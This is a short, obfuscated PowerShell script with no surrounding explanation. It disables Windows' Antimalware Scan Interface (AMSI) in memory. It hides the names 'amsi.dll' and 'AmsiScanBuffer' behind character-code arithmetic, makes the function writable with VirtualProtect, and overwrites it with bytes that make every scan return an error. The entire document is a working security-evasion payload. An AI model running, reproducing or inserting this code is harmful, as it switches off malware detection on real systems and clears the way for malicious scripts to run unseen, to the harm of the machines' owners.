$j2uLdpknbw = @"
using System;
using System.Runtime.InteropServices;
public class j2uLdpknbw {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr djK2XdkQvCxv, string EWyoUZAL5);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr wOW, UIntPtr Voy9cEcr, uint hYMVMzBpP5RT4di, out uint d89JRiBcuobWY4FHJ);
}
"@

Add-Type $j2uLdpknbw

$vOwGV = [j2uLdpknbw]::LoadLibrary("$([cHaR]([Byte]0x61)+[CHaR](109)+[Char]([bYtE]0x73)+[ChAR]([bYTE]0x69)+[CHar]([BYtE]0x2e)+[cHaR]([bytE]0x64)+[Char](91+17)+[ChAr](108+37-37))")
$fAaaguzOI1s1lPzM = [j2uLdpknbw]::GetProcAddress($vOwGV, "$(('Àmsî'+'Scán'+'Bûff'+'èr').norMalIZE([CHAr](15+55)+[cHar](111*14/14)+[Char]([bYTe]0x72)+[CHar]([byTe]0x6d)+[ChAr]([BYte]0x44)) -replace [chAr]([bYte]0x5c)+[ChAR]([bYte]0x70)+[ChAr](123*98/98)+[CHaR](77+48-48)+[char](21+89)+[cHar](125+27-27))")
$p = 0
[j2uLdpknbw]::VirtualProtect($fAaaguzOI1s1lPzM, [uint32]5, 0x40, [ref]$p)
$HM3XPq = "0xB8"
$gpJyG1C2BIMZzwSm1 = "0x57"
$p4F36ZZQNXyt1N9i1 = "0x00"
$E5GY_1 = "0x07"
$omy = "0x80"
$VRaN0Q = "0xC3"
$lxvhVH6iO = [Byte[]] ($HM3XPq,$gpJyG1C2BIMZzwSm1,$p4F36ZZQNXyt1N9i1,$E5GY_1,+$omy,+$VRaN0Q)
[System.Runtime.InteropServices.Marshal]::Copy($lxvhVH6iO, 0, $fAaaguzOI1s1lPzM, 6)